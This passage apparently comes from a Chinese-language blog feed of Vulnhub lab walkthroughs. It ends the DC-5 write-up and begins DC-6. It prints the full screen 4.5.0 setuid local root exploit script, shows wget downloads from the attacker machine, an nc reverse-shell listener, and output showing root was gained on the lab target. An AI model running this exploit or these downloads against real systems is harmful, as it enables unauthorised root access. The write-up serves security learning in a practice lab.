class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:~/html$ pwd  <br>pwd<br>/var/www/html<br>www-data@dc-5:~/html$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:21:43--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>41154.sh: Permission denied<br><br>Cannot write to &#x27;41154.sh&#x27; (Permission denied).<br>www-data@dc-5:~/html$ ls -l /var/www<br>ls -l /var/www<br>total 4<br>drwxr-xr-x 4 root root 4096 Apr 20  2019 html<br>www-data@dc-5:~/html$ ls -l / | grep tmp<br>ls -l / | grep tmp<br>drwxrwxrwt   7 root root  4096 Jul 13 01:17 tmp<br>www-data@dc-5:~/html$ wget http://192.168.135.141:8888/41154.sh /tmp<br>wget http://192.168.135.141:8888/41154.sh /tmp<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:22:37--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>41154.sh: Permission denied<br><br>Cannot write to &#x27;41154.sh&#x27; (Permission denied).<br>/tmp: Scheme missing.<br>www-data@dc-5:~/html$ cd /tmp<br>cd /tmp<br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:22:47--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]   1.16K  --.-KB/s   in 0s     <br><br>2022-07-13 01:22:47 (133 MB/s) - &#x27;41154.sh&#x27; saved [1192/1192]<br><br>www-data@dc-5:/tmp$ ls<br>ls<br>41154.sh<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory<br></code></pre></td></tr></table></figure><p>出现了报错，vi 查看，发现每行结尾出现了个 ^M ：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash^M</span><br><span class="hljs-comment"># screenroot.sh^M</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit^M</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.^M</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html^M</span><br><span class="hljs-comment"># HACK THE PLANET^M</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) ^M</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span>^M<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span>^M<br></code></pre></td></tr></table></figure><p>kali 上用 vi 打开脚本，末行模式下输入 <code>set ff=unix</code> ，再保存退出</p><blockquote><p><code>set ff=unix</code> : 告诉 vim 编辑器，使用unix换行符</p><p>这里之所以用 kali 是因为靶机上的 vi 不知道怎样使用，好像只能查看似的，摸不到头脑</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> vi 41154.sh</span> <br></code></pre></td></tr></table></figure><p>参考：</p><blockquote><p><a href="https://blog.csdn.net/hyj_king/article/details/120301359">【Linux】set ff=unix 郝少的博客-CSDN博客_ff=unix</a><br><a href="https://zhuanlan.zhihu.com/p/364037496">windows下编写的脚本文件，放到Linux中无法执行解决方法 - 知乎 (zhihu.com)</a></p></blockquote><p>靶机再次下载，加可执行权限，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-12 06:19:46--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1152 (1.1K) [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]   1.12K  --.-KB/s   in 0s     <br><br>2022-07-12 06:19:46 (137 MB/s) - &#x27;41154.sh&#x27; saved [1152/1152]<br><br>www-data@dc-5:/tmp$ ls<br>ls<br>41154.sh<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory<br>gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/libhax.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>No Sockets found in /tmp/screens/S-www-data.<br><br>./41154.sh: line 42: /tmp/rootshell: No such file or directory<br></code></pre></td></tr></table></figure><p>再次报错，可能靶机 gcc 编译时出错了，尝试 kali 编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x 41154.sh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./41154.sh</span> <br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>/tmp/libhax.c: In function ‘dropshell’:<br>/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]<br>    7 |     chmod(&quot;/tmp/rootshell&quot;, 04755);<br>      |     ^~~~~<br>/tmp/rootshell.c: In function ‘main’:<br>/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]<br>    3 |     setuid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]<br>    4 |     setgid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]<br>    5 |     seteuid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]<br>    6 |     setegid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]<br>    7 |     execvp(&quot;/bin/sh&quot;, NULL, NULL);<br>      |     ^~~~~~<br>/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>No Sockets found in /run/screen/S-kali.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>libhax.so  rootshell<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> mv /tmp/libhax.so ./</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> mv /tmp/rootshell ./</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span>                <br>41154.sh libhax.so  rootshell<br></code></pre></td></tr></table></figure><p>修改一下脚本，将与编译有关的代码删掉：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># screenroot.sh</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="hljs-comment"># HACK THE PLANET</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) </span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">umask</span> 000 <span class="hljs-comment"># because</span><br>screen -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="hljs-comment"># newline needed</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Triggering...&quot;</span><br>screen -ls <span class="hljs-comment"># screen itself is setuid, so... </span><br>/tmp/rootshell<br></code></pre></td></tr></table></figure><p>靶机进行下载运行，成功得到 root ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/libhax.so<br>wget http://192.168.135.141:8888/libhax.so<br>converted &#x27;http://192.168.135.141:8888/libhax.so&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/libhax.so&#x27; (UTF-8)<br>--2022-07-12 04:50:05--  http://192.168.135.141:8888/libhax.so<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15552 (15K) [application/octet-stream]<br>Saving to: &#x27;libhax.so&#x27;<br><br>libhax.so           100%[=====================&gt;]  15.19K  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:05 (69.6 MB/s) - &#x27;libhax.so&#x27; saved [15552/15552]<br><br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/rootshell<br>wget http://192.168.135.141:8888/rootshell<br>converted &#x27;http://192.168.135.141:8888/rootshell&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/rootshell&#x27; (UTF-8)<br>--2022-07-12 04:50:17--  http://192.168.135.141:8888/rootshell<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 16336 (16K) [application/octet-stream]<br>Saving to: &#x27;rootshell&#x27;<br><br>rootshell           100%[=====================&gt;]  15.95K  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:17 (109 MB/s) - &#x27;rootshell&#x27; saved [16336/16336]<br><br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-12 04:50:29--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 566 [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]     566  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:29 (174 MB/s) - &#x27;41154.sh&#x27; saved [566/566]<br><br>www-data@dc-5:/tmp$ chmod +x libhax.so<br>chmod +x libhax.so<br>www-data@dc-5:/tmp$ chmod +x rootshell<br>chmod +x rootshell<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>[+] done!<br>No Sockets found in /tmp/screens/S-www-data.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>ls /root<br>thisistheflag.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/thisistheflag.txt</span><br>cat /root/thisistheflag.txt<br><br><br>888b    888 d8b                                                      888      888 888 888 <br>8888b   888 Y8P                                                      888      888 888 888 <br>88888b  888                                                          888      888 888 888 <br>888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 <br>888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888 <br>888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P <br>888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;  <br>888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888 <br>                                                                                          <br>                                                                                          <br><br><br>Once again, a big thanks to all those who do these little challenges,<br>and especially all those who give me feedback - again, it&#x27;s all greatly<br>appreciated.  :-)<br><br>I also want to send a big thanks to all those who find the vulnerabilities<br>and create the exploits that make these challenges possible.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol><li>文件包含漏洞</li><li>将反弹 shell 写入日志文件，实现反弹</li><li>screen 提权（SUID 提权）：函数劫持</li></ol><h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><p>直接运行 screen-4.5.0 ：</p><blockquote><p><a href="https://blog.csdn.net/weixin_43376075/article/details/124424541">(Must be connected to a terminal解决方法_美豆阿的博客-CSDN博客</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 38556<br>/bin/screen-4.5.0<br>Must be connected to a terminal.<br><br>script /dev/null<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> /bin/screen-4.5.0</span><br>/bin/screen-4.5.0<br>Please set a terminal type.<br><span class="hljs-meta">$</span><span class="bash"> script /dev/null</span><br>script /dev/null<br>Script started, file is /dev/null<br><span class="hljs-meta">$</span><span class="bash"> /bin/screen-4.5.0</span><br>/bin/screen-4.5.0<br>Please set a terminal type.<br></code></pre></td></tr></table></figure><p>解决无法运行的问题，但调用的权限并不是 root：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 38556<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-5:~/html$ /bin/screen-4.5.0<br>/bin/screen-4.5.0<br>Please set a terminal type.<br><br>www-data@dc-5:~/html$ export -p         <br>export -p<br>declare -x HOME=&quot;/var/www&quot;<br>declare -x OLDPWD<br>declare -x PWD=&quot;/var/www/html&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x USER=&quot;www-data&quot;<br>www-data@dc-5:~/html$ export TERM=&quot;xterm-256color&quot;<br>export TERM=&quot;xterm-256color&quot;<br>www-data@dc-5:~/html$ export -p<br>export -p<br>declare -x HOME=&quot;/var/www&quot;<br>declare -x OLDPWD<br>declare -x PWD=&quot;/var/www/html&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;www-data&quot;<br>www-data@dc-5:~/html$ echo $TERM<br>echo $TERM<br>xterm-256color<br><br>www-data@dc-5:~/html$ screen -s /bin/sh<br>screen -s /bin/sh<br>[screen is terminating]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> ps -aux | grep screen</span><br>ps -aux | grep screen<br>www-data  1532  0.0  0.2  21832  2252 pts/1    S+   02:23   0:00 screen -s /bin/sh<br>www-data  1543  0.0  0.0  11128   960 pts/2    S+   02:27   0:00 grep screen<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br><br>www-data@dc-5:~/html$ ls -l /bin/screen-4.5.0<br>ls -l /bin/screen-4.5.0<br>-rwsr-xr-x 1 root root 1441352 Apr 19  2019 /bin/screen-4.5.0<br></code></pre></td></tr></table></figure><p>完整的利用脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># screenroot.sh</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="hljs-comment"># HACK THE PLANET</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) </span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span><br>cat &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/libhax.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">#include &lt;sys/types.h&gt;</span><br><span class="hljs-string">#include &lt;unistd.h&gt;</span><br><span class="hljs-string">__attribute__ ((__constructor__))</span><br><span class="hljs-string">void dropshell(void)&#123;</span><br><span class="hljs-string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="hljs-string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="hljs-string">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="hljs-string">    printf(&quot;[+] done!\n&quot;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c<br>rm -f /tmp/libhax.c<br>cat &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/rootshell.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">int main(void)&#123;</span><br><span class="hljs-string">    setuid(0);</span><br><span class="hljs-string">    setgid(0);</span><br><span class="hljs-string">    seteuid(0);</span><br><span class="hljs-string">    setegid(0);</span><br><span class="hljs-string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>gcc -o /tmp/rootshell /tmp/rootshell.c<br>rm -f /tmp/rootshell.c<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">umask</span> 000 <span class="hljs-comment"># because</span><br>screen -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="hljs-comment"># newline needed</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Triggering...&quot;</span><br>screen -ls <span class="hljs-comment"># screen itself is setuid, so... </span><br>/tmp/rootshell<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://man.linuxde.net/screen">screen命令_Linux screen 命令用法详解：用于命令行终端切换 (linuxde.net)</a></p><p><a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">[screen-devel] [bug #50142] root exploit 4.5.0 (gnu.org)</a></p><p><a href="https://www.cnblogs.com/sench/p/8933638.html">linux命令—umask - ColdCode - 博客园 (cnblogs.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1683272">LD_PRELOAD 后门 | Linux 后门系列 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://blog.csdn.net/whatday/article/details/108890018">linux LD_PRELOAD 预加载 so 简介 whatday的博客-CSDN博客_ld_preload</a></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC：6</title>
    <link href="/2022/07/11/Penetration/Vulnhub/Part-1/0x09%20DC-6/"/>
    <url>/2022/07/11/Penetration/Vulnhub/Part-1/0x09%20DC-6/</url>
    
    <content type="html"><![CDATA[<h1 id="0x09-DC-6-vulnhub"><a href="#0x09-DC-6-vulnhub" class="headerlink" title="0x09 DC: 6~vulnhub"></a>0x09 DC: 6~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-6,315/">DC: 6 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.161</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.161</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 